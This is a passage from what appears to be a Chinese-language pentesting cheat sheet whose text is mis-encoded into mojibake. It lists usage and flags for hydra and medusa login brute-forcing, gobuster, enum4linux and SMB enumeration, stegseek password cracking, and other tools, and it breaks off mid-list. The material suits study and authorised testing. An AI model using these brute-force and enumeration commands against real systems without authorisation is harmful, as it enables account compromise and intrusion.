<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">hydra -L <span class="tag">&lt;<span class="name">ç”¨æˆ·ååˆ—è¡¨</span>&gt;</span> -P <span class="tag">&lt;<span class="name">å¯†ç åˆ—è¡¨</span>&gt;</span> <span class="tag">&lt;<span class="name">åè®®</span>&gt;</span>://<span class="tag">&lt;<span class="name">ç›®æ ‡</span>&gt;</span>:<span class="tag">&lt;<span class="name">ç«¯å£</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ”¯æŒ SSHã€FTPã€HTTP ç­‰åè®®ã€‚</p>
<h3 id="å¸¸ç”¨å‚æ•°-5"><a href="#å¸¸ç”¨å‚æ•°-5" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><code>-L &lt;æ–‡ä»¶&gt;</code></td>
<td>æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·åçš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><code>-l &lt;ç”¨æˆ·å&gt;</code></td>
<td>æŒ‡å®šå•ä¸ªç”¨æˆ·åã€‚</td>
</tr>
<tr>
<td><code>-P &lt;æ–‡ä»¶&gt;</code></td>
<td>æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><code>-p &lt;å¯†ç &gt;</code></td>
<td>æŒ‡å®šå•ä¸ªå¯†ç ã€‚</td>
</tr>
<tr>
<td><code>-t &lt;çº¿ç¨‹æ•°&gt;</code></td>
<td>æŒ‡å®šçº¿ç¨‹æ•°ï¼Œé»˜è®¤ä¸º16ã€‚å¯ä»¥å¢åŠ æ¥æé«˜ç ´è§£é€Ÿåº¦ï¼Œä½†è¿‡é«˜å¯èƒ½ä¼šè¢«ç›®æ ‡å°ç¦æˆ–é€ æˆç½‘ç»œé—®é¢˜ã€‚</td>
</tr>
<tr>
<td><code>-o &lt;æ–‡ä»¶&gt;</code></td>
<td>å°†ç ´è§£æˆåŠŸçš„ç»“æœä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚</td>
</tr>
</tbody></table>
<p><code>-i</code>å¿½ç•¥å¯†ç å­—æ®µï¼Œè¡¨ç¤ºä½¿ç”¨ SSH ç§é’¥è¿›è¡Œè®¤è¯  <code>-s 22</code>ï¼šæŒ‡å®š SSH ç«¯å£ï¼ˆé»˜è®¤ 22ï¼‰  <code>-p id_rsa</code>ï¼šæŒ‡å®š SSH ç§é’¥ï¼ˆå³ <code>id_rsa</code>ï¼‰<br>-V -I -e nsr   nsrè¡¨ç¤ºå°è¯•ç©ºå¯†ç  å°è¯•ç”¨æˆ·åæœ¬èº« å°è¯•ç”¨æˆ·ååè½¬</p>
<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><p><code>gobuster</code> æ˜¯ä¸€ä¸ªç”¨ Go è¯­è¨€ç¼–å†™çš„ç›®å½• &#x2F; æ–‡ä»¶æ‰«æå·¥å…·ï¼Œå¸¸ç”¨äºæ¸—é€æµ‹è¯•å’Œå®‰å…¨å®¡è®¡ä¸­ï¼Œç›®çš„æ˜¯é€šè¿‡æš´åŠ›ç ´è§£æˆ–å­—å…¸æ”»å‡»æ¥å‘ç° Web æœåŠ¡å™¨ä¸Šçš„éšè—ç›®å½•å’Œæ–‡ä»¶ã€‚<br><code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code><br>é»˜è®¤å­—å…¸ç›®å½•åœ¨<code>/usr/share/wordlists/dirbuster/</code> ä¸‹<br>-s æŒ‡å®šè¦æ˜¾ç¤ºçš„httpçŠ¶æ€ç    -tæŒ‡å®šçº¿ç¨‹ ä¸€èˆ¬ç”¨50 60 -b æ’é™¤çŠ¶æ€ç <br>å­—å…¸ä½ç½®ï¼š&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;<br><img src="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png"><br>ä¸€èˆ¬æ˜¯dirsearchæ²¡æœ‰å‘ç°æœ‰ç”¨çš„å†…å®¹çš„æ—¶å€™ç”¨è¿™ä¸ªæ‰«æå™¨  ç”¨è¿™ä¸ª mediumå­—å…¸<br>-b å¯ä»¥æ’é™¤çŠ¶æ€ç   -xè¦æ£€æŸ¥çš„ç±»å‹ æ¯”å¦‚ txt php </p>
<h2 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h2><p><strong><code>enum4linux</code></strong> æ˜¯ä¸€æ¬¾ç”¨äº Linux ç³»ç»Ÿä¸Šçš„ SMBï¼ˆServer Message Blockï¼‰åè®®æšä¸¾å·¥å…·ï¼Œå¸¸ç”¨äºç½‘ç»œå®‰å…¨æµ‹è¯•ä¸­è¿›è¡Œ Windows ç³»ç»Ÿçš„æšä¸¾ã€‚å®ƒèƒ½å¤Ÿå¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜è·å–æœ‰å…³ Windows ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚å…±äº«èµ„æºã€ç”¨æˆ·è´¦æˆ·ã€æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€åŸŸåç­‰ã€‚<br>åŠŸèƒ½å’Œsmbmapå·®ä¸å¤š</p>
<h3 id="å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹"><a href="#å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹" class="headerlink" title="å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹"></a>å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>enum4linux -S &lt;target_ip&gt;</code></td>
<td>åˆ—å‡ºç›®æ ‡ç³»ç»Ÿçš„å…±äº«èµ„æºã€‚</td>
</tr>
<tr>
<td><code>smbmap -H &lt;target_ip&gt;</code></td>
<td>åˆ—å‡ºç›®æ ‡ç³»ç»Ÿçš„å…±äº«èµ„æºï¼ˆæ›¿ä»£ <code>enum4linux -S</code>ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>enum4linux -O &lt;target_ip&gt;</code></td>
<td>è·å–ç›®æ ‡ Windows ç³»ç»Ÿçš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€‚</td>
</tr>
<tr>
<td><code>enum4linux -U &lt;target_ip&gt;</code></td>
<td>åˆ—å‡ºç›®æ ‡è®¡ç®—æœºä¸Šçš„æ‰€æœ‰ç”¨æˆ·è´¦æˆ·ã€‚</td>
</tr>
<tr>
<td><code>enum4linux -P &lt;target_ip&gt;</code></td>
<td>è·å–ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·çš„ç™»å½•å†å²ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>enum4linux -A &lt;target_ip&gt;</code></td>
<td>è¯·æ±‚æ›´å¤šçš„æšä¸¾ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…±äº«ã€ç”¨æˆ·ç­‰æ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>enum4linux -G &lt;target_ip&gt;</code></td>
<td>è·å–ç›®æ ‡ç³»ç»Ÿä¸Šç»„çš„ç›¸å…³ä¿¡æ¯ã€‚</td>
</tr>
</tbody></table>
<h2 id="stegseek"><a href="#stegseek" class="headerlink" title="stegseek"></a>stegseek</h2><p>Stegseek æ˜¯ä¸€æ¬¾å¿«é€Ÿçš„ <strong>JPEG éšå†™åˆ†æå·¥å…·</strong>ï¼Œä¸“é—¨ç”¨äºç ´è§£ <code>steghide</code> éšå†™çš„å›¾ç‰‡æ–‡ä»¶ã€‚å®ƒå¯ä»¥ <strong>é«˜æ•ˆçˆ†ç ´å¯†ç </strong>ï¼Œå¹¶æå–éšè—æ•°æ®ã€‚</p>
<p>Stegseek ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å¿«é€Ÿçˆ†ç ´å¯†ç </strong>ï¼šåŸºäºå­—å…¸çš„æ”»å‡»ï¼Œé€Ÿåº¦æå¿«ã€‚</li>
<li><strong>æå–éšè—æ•°æ®</strong>ï¼šæ— éœ€å¯†ç æ—¶ï¼Œå°è¯•é»˜è®¤å¯†ç æˆ–ç©ºå¯†ç æå–ã€‚</li>
<li><strong>æ£€æŸ¥å›¾ç‰‡æ˜¯å¦å«æœ‰éšå†™æ•°æ®</strong>ã€‚</li>
</ul>
<h3 id="å¸¸ç”¨å‚æ•°-6"><a href="#å¸¸ç”¨å‚æ•°-6" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>-sf</code>, <code>--stegofile</code></td>
<td>é€‰æ‹©éšå†™æ–‡ä»¶</td>
</tr>
<tr>
<td><code>-wl</code>, <code>--wordlist</code></td>
<td>é€‰æ‹©å¯†ç å­—å…¸æ–‡ä»¶ï¼Œç”¨äºæš´åŠ›ç ´è§£</td>
</tr>
<tr>
<td><code>-xf</code>, <code>--extractfile</code></td>
<td>æŒ‡å®šæå–æ•°æ®æ—¶çš„æ–‡ä»¶å</td>
</tr>
<tr>
<td><code>-t</code>, <code>--threads</code></td>
<td>è®¾å®šçº¿ç¨‹æ•°é‡ï¼Œé»˜è®¤ä¸º CPU æ ¸å¿ƒæ•°</td>
</tr>
<tr>
<td><code>-f</code>, <code>--force</code></td>
<td>å¼ºåˆ¶è¦†ç›–å·²å­˜åœ¨çš„æ–‡ä»¶</td>
</tr>
<tr>
<td><code>-v</code>, <code>--verbose</code></td>
<td>æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</td>
</tr>
<tr>
<td><code>-q</code>, <code>--quiet</code></td>
<td>éšè—æ€§èƒ½æŒ‡æ ‡ï¼ˆå¯èƒ½æå‡æ€§èƒ½ï¼‰</td>
</tr>
<tr>
<td><code>-s</code>, <code>--skipdefault</code></td>
<td>ä¸ä½¿ç”¨é»˜è®¤çŒœæµ‹ï¼ˆå¦‚ç©ºå¯†ç ã€æ–‡ä»¶åç­‰ï¼‰</td>
</tr>
<tr>
<td><code>-n</code>, <code>--nocolor</code></td>
<td>ç¦ç”¨ç»ˆç«¯è¾“å‡ºçš„é¢œè‰²</td>
</tr>
<tr>
<td><code>-c</code>, <code>--continue</code></td>
<td>åœ¨æ‰¾åˆ°ç»“æœåç»§ç»­ç ´è§£ï¼ˆå¯èƒ½å­˜åœ¨å¤šä¸ªåµŒå…¥æ–‡ä»¶ï¼‰</td>
</tr>
<tr>
<td><code>-a</code>, <code>--accessible</code></td>
<td>ç®€åŒ–è¾“å‡ºï¼Œä½¿å…¶æ›´é€‚ç”¨äºå±å¹•é˜…è¯»å™¨</td>
</tr>
</tbody></table>
<p>ä¸€èˆ¬æŒ‡å®šrockyouå­—å…¸å°±å¯ä»¥</p>
<h2 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h2><p><code>steghide</code> æ˜¯ Kali Linux ä¸­å¸¸ç”¨çš„ <strong>éšå†™æœ¯å·¥å…·</strong>ï¼Œä¸»è¦ç”¨äº <strong>JPEGã€BMPã€WAVã€AU</strong> æ ¼å¼çš„ <strong>æ•°æ®éšè—ä¸æå–</strong>ã€‚å®ƒæ”¯æŒ <strong>å¯†ç åŠ å¯†</strong>ï¼Œå› æ­¤å¦‚æœæ•°æ®è¢«åŠ å¯†åµŒå…¥ï¼Œéœ€è¦æ­£ç¡®çš„å¯†ç æ‰èƒ½æå–ã€‚</p>
<p><strong>Steghide å¸¸ç”¨å‚æ•°</strong></p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>info</code></td>
<td><strong>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</strong>ï¼Œæ£€æŸ¥æ˜¯å¦åŒ…å«éšè—æ•°æ®</td>
</tr>
<tr>
<td><code>extract</code></td>
<td><strong>æå–éšè—æ•°æ®</strong></td>
</tr>
<tr>
<td><code>embed</code></td>
<td><strong>å‘æ–‡ä»¶ä¸­åµŒå…¥æ•°æ®</strong></td>
</tr>
<tr>
<td><code>-sf file</code></td>
<td><strong>æŒ‡å®šè½½ä½“æ–‡ä»¶</strong>ï¼ˆå¦‚å›¾ç‰‡ã€éŸ³é¢‘ï¼‰</td>
</tr>
<tr>
<td><code>-ef file</code></td>
<td><strong>æŒ‡å®šè¦éšè—çš„æ–‡ä»¶</strong></td>
</tr>
<tr>
<td><code>-p password</code></td>
<td><strong>æŒ‡å®šå¯†ç </strong>ï¼ˆå¦‚æœæœ‰åŠ å¯†ï¼‰</td>
</tr>
<tr>
<td><code>-cf file</code></td>
<td><strong>æŒ‡å®šè½½ä½“æ–‡ä»¶</strong>ï¼ˆç”¨äºåµŒå…¥æ•°æ®ï¼‰</td>
</tr>
<tr>
<td><code>-v</code></td>
<td><strong>è¯¦ç»†æ¨¡å¼</strong>ï¼ˆverboseï¼Œæ˜¾ç¤ºæ›´å¤šä¿¡æ¯ï¼‰</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><strong>å·¥å…·</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>æ”¯æŒæ ¼å¼</strong></th>
<th><strong>åŠ å¯†æ”¯æŒ</strong></th>
<th><strong>ç ´è§£èƒ½åŠ›</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>steghide</strong></td>
<td><strong>æ•°æ®éšè— &amp; æå–</strong></td>
<td>JPEGã€BMPã€WAVã€AU</td>
<td>âœ… æ”¯æŒå¯†ç åŠ å¯†</td>
<td>âŒ æ— æ³•ç ´è§£å¯†ç </td>
</tr>
<tr>
<td><strong>stegseek</strong></td>
<td><strong>å¿«é€Ÿç ´è§£ steghide éšå†™å¯†ç </strong></td>
<td><strong>ä»…æ”¯æŒ JPEG</strong></td>
<td>âœ… ç ´è§£åŠ å¯†çš„ steghide æ–‡ä»¶</td>
<td>âœ… è¶…å¿«å­—å…¸æ”»å‡»</td>
</tr>
</tbody></table>
<h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p><code>zsteg</code> æ˜¯ Kali Linux ä¸­ç”¨äºæ£€æµ‹ <strong>PNG</strong> å’Œ <strong>BMP</strong> å›¾åƒä¸­çš„ <strong>éšå†™æ•°æ®</strong>ï¼ˆSteganographyï¼‰çš„å·¥å…·ã€‚å®ƒèƒ½å¤Ÿæ‰«æå›¾åƒçš„ <strong>RGB é€šé“ã€Alpha é€šé“ï¼Œä»¥åŠä¸åŒä½æ·±åº¦</strong> æ¥æŸ¥æ‰¾éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚ <strong>æ–‡æœ¬ã€äºŒè¿›åˆ¶æ•°æ®ã€shellcode</strong> ç­‰ã€‚<br> <strong>zsteg å¸¸ç”¨å‚æ•°</strong></p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-a</code></td>
<td>å¯¹å›¾åƒè¿›è¡Œ<strong>å…¨é¢æ‰«æ</strong>ï¼ˆå¸¸ç”¨ï¼‰</td>
</tr>
<tr>
<td><code>-c X</code></td>
<td>ä»…æ‰«æ<strong>é€šé“</strong> <code>X</code>ï¼ˆ<code>r</code>&#x3D;çº¢ï¼Œ<code>g</code>&#x3D;ç»¿ï¼Œ<code>b</code>&#x3D;è“ï¼Œ<code>a</code>&#x3D;é€æ˜åº¦ï¼‰</td>
</tr>
<tr>
<td><code>-b X</code></td>
<td>ä»…æ‰«æ<strong>ç¬¬ X ä½</strong>ï¼ˆå¦‚ <code>-b 1</code> ä»…æ£€æµ‹æœ€ä½ä½ LSBï¼‰</td>
</tr>
<tr>
<td><code>-v</code></td>
<td><strong>æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</strong>ï¼ˆverbose æ¨¡å¼ï¼‰</td>
</tr>
<tr>
<td><code>-p</code></td>
<td>ä»…æ˜¾ç¤º <strong>æœ‰æ•ˆç»“æœ</strong></td>
</tr>
<tr>
<td><code>-E fmt</code></td>
<td>ä»¥æŒ‡å®šæ ¼å¼æå–æ•°æ®ï¼ˆå¦‚ <code>-E bin</code> æå–äºŒè¿›åˆ¶ï¼‰</td>
</tr>
<tr>
<td><code>--lsb Y</code></td>
<td>ä»…æ‰«æ <code>Y</code> ä½çš„ <strong>æœ€ä½æœ‰æ•ˆä½ï¼ˆLSBï¼‰</strong></td>
</tr>
<tr>
<td><code>-o filename</code></td>
<td><strong>å°†æå–çš„æ•°æ®è¾“å‡º</strong>åˆ°æ–‡ä»¶</td>
</tr>
<tr>
<td><code>-q</code></td>
<td><strong>å®‰é™æ¨¡å¼</strong>ï¼ˆåªè¾“å‡ºå¿…è¦ä¿¡æ¯ï¼‰</td>
</tr>
<tr>
<td><code>--dump</code></td>
<td>ç›´æ¥è½¬å‚¨æ‰¾åˆ°çš„æ•°æ®</td>
</tr>
</tbody></table>
<h2 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h2><p><code>rax2</code> æ˜¯ radare æ¡†æ¶ä¸­çš„ä¸€ä¸ªå°å·¥å…·ï¼Œå…¶è®¾è®¡ç›®çš„æ˜¯ä¸º shell æä¾›ä¸€ä¸ªå°å‹çš„è¡¨è¾¾å¼è®¡ç®—å™¨ã€‚å…¶å¯ç”¨äºæµ®ç‚¹æ•°ã€åå…­è¿›åˆ¶å­—èŠ‚çš„è¿›åˆ¶è½¬æ¢ï¼Œåå…­è¿›åˆ¶è½¬ asciiï¼Œå…«è¿›åˆ¶è½¬æ•´æ•°ç­‰ã€‚è‹¥æœªä¼ å…¥ä»»ä½•å‚æ•°è¿˜å¯ä½œä¸ºä¸€ä¸ªè®¡ç®—å™¨ shell ä½¿ç”¨ã€‚<br>è¾“å…¥ rax2 -h æŸ¥çœ‹å‚æ•°</p>
<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><p> <code>tcpdump</code> æ˜¯ Linux å’Œ macOS ä¸Šçš„<strong>ç½‘ç»œæŠ“åŒ…å·¥å…·</strong>ï¼Œç”¨äº<strong>æŠ“å–ã€åˆ†æå’Œè¿‡æ»¤ç½‘ç»œæ•°æ®åŒ…</strong>ï¼Œç±»ä¼¼äº Wireshark çš„å‘½ä»¤è¡Œç‰ˆæœ¬ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">tcpdump -<span class="selector-tag">A</span> -n icmp</span><br></pre></td></tr></table></figure></div>
<p><strong>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ï¼š</strong><br>ğŸ‘‰ <strong>ç›‘å¬ ICMPï¼ˆInternet Control Message Protocolï¼‰æµé‡</strong>ï¼Œæ¯”å¦‚ <code>ping</code> è¯·æ±‚å’Œå›å¤ï¼Œå¹¶ä»¥ <strong>ASCII æ–¹å¼æ˜¾ç¤ºæ•°æ®åŒ…å†…å®¹</strong>ã€‚<br>-A  ä»¥ <strong>ASCII æ ¼å¼</strong> æ˜¾ç¤ºæ•°æ®åŒ…å†…å®¹ï¼Œæ–¹ä¾¿é˜…è¯»ï¼ˆé€‚ç”¨äºæ˜æ–‡åè®®ï¼‰<br>-n <strong>ä¸è§£æ DNS</strong>ï¼Œç›´æ¥æ˜¾ç¤º IP åœ°å€ï¼ˆåŠ å¿«é€Ÿåº¦ï¼‰<br>icmp åªæŠ“å– <strong>ICMP</strong> æµé‡ï¼Œæ¯”å¦‚ <code>ping</code> è¯·æ±‚å’Œå“åº”</p>
<h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><p><code>medusa</code>Â æ˜¯å¦ä¸€ä¸ªå¿«é€Ÿä¸”å¹¶è¡Œçš„ç™»å½•çˆ†ç ´å·¥å…·ã€‚</p>
<h3 id="å¸¸ç”¨å‚æ•°-7"><a href="#å¸¸ç”¨å‚æ•°-7" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>-h &lt;ç›®æ ‡ä¸»æœº&gt;</code></td>
<td>æŒ‡å®šç›®æ ‡ IP æˆ–ä¸»æœºåï¼ˆå¯ä»¥ç”¨ <code>-H</code> ä¼ å…¥åŒ…å«å¤šä¸ªç›®æ ‡çš„æ–‡ä»¶ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-u &lt;ç”¨æˆ·å&gt;</code></td>
<td>æŒ‡å®šå•ä¸ªç”¨æˆ·åã€‚</td>
</tr>
<tr>
<td><code>-U &lt;ç”¨æˆ·åæ–‡ä»¶&gt;</code></td>
<td>æŒ‡å®šç”¨æˆ·ååˆ—è¡¨æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><code>-p &lt;å¯†ç &gt;</code></td>
<td>æŒ‡å®šå•ä¸ªå¯†ç ã€‚</td>
</tr>
<tr>
<td><code>-P &lt;å¯†ç æ–‡ä»¶&gt;</code></td>
<td>æŒ‡å®šå¯†ç åˆ—è¡¨æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><code>-M &lt;æœåŠ¡&gt;</code></td>
<td>æŒ‡å®šè¦æ”»å‡»çš„æœåŠ¡ï¼Œå¦‚ <code>ssh</code>ã€<code>ftp</code>ã€<code>http</code> ç­‰ã€‚</td>
</tr>
<tr>
<td><code>-t &lt;çº¿ç¨‹æ•°&gt;</code></td>
<td>æŒ‡å®šå¹¶å‘çº¿ç¨‹æ•°ï¼Œæé«˜çˆ†ç ´æ•ˆç‡ã€‚</td>
</tr>
<tr>
<td><code>-n &lt;ç«¯å£å·&gt;</code></td>
<td>æŒ‡å®šç›®æ ‡æœåŠ¡çš„ç«¯å£å·ï¼ˆå¦‚æœé»˜è®¤ç«¯å£ä¸åŒï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>æ‰¾åˆ°æœ‰æ•ˆå‡­æ®åç«‹å³åœæ­¢æ”»å‡»ï¼ˆå¯é€‰ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-v</code> &#x2F; <code>-V</code></td>
<td>è®¾ç½®è¾“å‡ºè¯¦ç»†ç¨‹åº¦ã€‚</td>
</tr>
</tbody></table>
<h2 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h2><p><code>ssh-keygen</code> æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆã€ç®¡ç†å’Œè½¬æ¢ SSH è®¤è¯å¯†é’¥çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒæ”¯æŒå¤šç§å¯†é’¥ç±»å‹ï¼ŒåŒ…æ‹¬ RSAã€DSAã€ECDSA å’Œ Ed25519ã€‚è¯¥å·¥å…·å¸¸ç”¨äºä¸º SSH è¿æ¥åˆ›å»ºå…¬é’¥å’Œç§é’¥å¯¹ï¼Œä»¥å®ç°å®‰å…¨çš„æ— å¯†ç ç™»å½•ã€‚</p>
<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-t</code></td>
<td align="left">æŒ‡å®šè¦åˆ›å»ºçš„å¯†é’¥ç±»å‹ï¼Œå¦‚ <code>rsa</code>ã€<code>dsa</code>ã€<code>ecdsa</code>ã€<code>ed25519</code> ç­‰ã€‚</td>
</tr>
<tr>
<td align="left"><code>-b</code></td>
<td align="left">è®¾ç½®å¯†é’¥é•¿åº¦ï¼ˆä»¥ä½ä¸ºå•ä½ï¼‰ï¼Œä¾‹å¦‚ 2048 æˆ– 4096ã€‚</td>
</tr>
<tr>
<td align="left"><code>-C</code></td>
<td align="left">æ·»åŠ æ³¨é‡Šï¼Œé€šå¸¸ç”¨äºæ ‡è¯†å¯†é’¥æ‰€æœ‰è€…ï¼Œä¾‹å¦‚é‚®ç®±åœ°å€ã€‚</td>
</tr>
<tr>
<td align="left"><code>-f</code></td>
<td align="left">æŒ‡å®šå¯†é’¥æ–‡ä»¶çš„ä¿å­˜è·¯å¾„å’Œåç§°ã€‚</td>
</tr>
<tr>
<td align="left"><code>-N</code></td>
<td align="left">ä¸ºç§é’¥è®¾ç½®æ–°å¯†ç ã€‚</td>
</tr>
<tr>
<td align="left"><code>-P</code></td>
<td align="left">æä¾›æ—§å¯†ç ï¼Œç”¨äºæ›´æ”¹ç°æœ‰ç§é’¥çš„å¯†ç ã€‚</td>
</tr>
<tr>
<td align="left"><code>-q</code></td>
<td align="left">é™é»˜æ¨¡å¼ï¼Œåœ¨ç”Ÿæˆå¯†é’¥æ—¶ä¸æ˜¾ç¤ºæç¤ºå’Œè¿›åº¦ã€‚</td>
</tr>
<tr>
<td align="left"><code>-y</code></td>
<td align="left">ä»ç§é’¥æ–‡ä»¶è¯»å–å¹¶è¾“å‡ºå¯¹åº”çš„å…¬é’¥ã€‚</td>
</tr>
<tr>
<td align="left"><code>-l</code></td>
<td align="left">æ˜¾ç¤ºæŒ‡å®šå…¬é’¥æ–‡ä»¶çš„æŒ‡çº¹ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td align="left"><code>-e</code></td>
<td align="left">å°† OpenSSH ç§é’¥è½¬æ¢ä¸º RFC 4716 æ ¼å¼ã€‚</td>
</tr>
<tr>
<td align="left"><code>-i</code></td>
<td align="left">å°† RFC 4716 æ ¼å¼çš„å¯†é’¥è½¬æ¢ä¸º OpenSSH æ ¼å¼ã€‚</td>
</tr>
<tr>
<td align="left"><code>-p</code></td>
<td align="left">æ›´æ”¹ç°æœ‰ç§é’¥æ–‡ä»¶çš„å¯†ç ã€‚</td>
</tr>
<tr>
<td align="left"><code>-o</code></td>
<td align="left">å¼ºåˆ¶ä½¿ç”¨æ–°çš„ OpenSSH æ ¼å¼ä¿å­˜ç§é’¥ï¼Œæä¾›æ›´å¥½çš„å®‰å…¨æ€§ã€‚</td>
</tr>
<tr>
<td align="left"><code>-m</code></td>
<td align="left">æŒ‡å®šå¯†é’¥çš„æ˜¾ç¤ºæˆ–ä¿å­˜æ ¼å¼ï¼Œå¦‚ <code>PEM</code>ã€‚</td>
</tr>
<tr>
<td align="left"><code>-r</code></td>
<td align="left">ç”Ÿæˆç”¨äº DNS çš„ SSHFP èµ„æºè®°å½•ã€‚</td>
</tr>
<tr>
<td align="left"><code>-B</code></td>
<td align="left">ä»¥ Bubble Babble æ ¼å¼æ˜¾ç¤ºå¯†é’¥æŒ‡çº¹ã€‚</td>
</tr>
<tr>
<td align="left"><code>-F</code></td>
<td align="left">æœç´¢æŒ‡å®šçš„å·²çŸ¥ä¸»æœºæ–‡ä»¶ä¸­çš„ä¸»æœºæ¡ç›®ã€‚</td>
</tr>
<tr>
<td align="left"><code>-R</code></td>
<td align="left">ä»å·²çŸ¥ä¸»æœºæ–‡ä»¶ä¸­åˆ é™¤æŒ‡å®šä¸»æœºçš„æ‰€æœ‰æ¡ç›®ã€‚</td>
</tr>
</tbody></table>
<p>æ‰€ä»¥è¦ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥å°±ç”¨<code>ssh-keygen -y -f ~/.ssh/id_rsa &gt; ~/.ssh/id_rsa.pub</code></p>
<h2 id="msf-pattern-create"><a href="#msf-pattern-create" class="headerlink" title="msf-pattern_create"></a>msf-pattern_create</h2><p><code>msf-pattern_create</code> æ˜¯ Metasploit Framework ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºç”Ÿæˆç‰¹å®šçš„æ¨¡å¼å­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”¨äºç¼“å†²åŒºæº¢å‡ºæ¼æ´æµ‹è¯•ä¸­çš„æ¨¡å¼åˆ›å»ºã€‚</p>
<p>å®ƒé€šè¿‡ç”Ÿæˆä¸€ç»„å”¯ä¸€çš„å­—èŠ‚æ¨¡å¼ï¼ˆé€šå¸¸æ˜¯ ASCII å­—ç¬¦ä¸²ï¼‰ï¼Œè¿™äº›æ¨¡å¼å¯ä»¥å¸®åŠ©ä½ å®šä½æ ˆæº¢å‡ºæ—¶çš„è¿”å›åœ°å€æˆ–å…¶ä»–æº¢å‡ºç‚¹ã€‚å¸¸è§çš„ä½¿ç”¨åœºæ™¯åŒ…æ‹¬ï¼š</p>
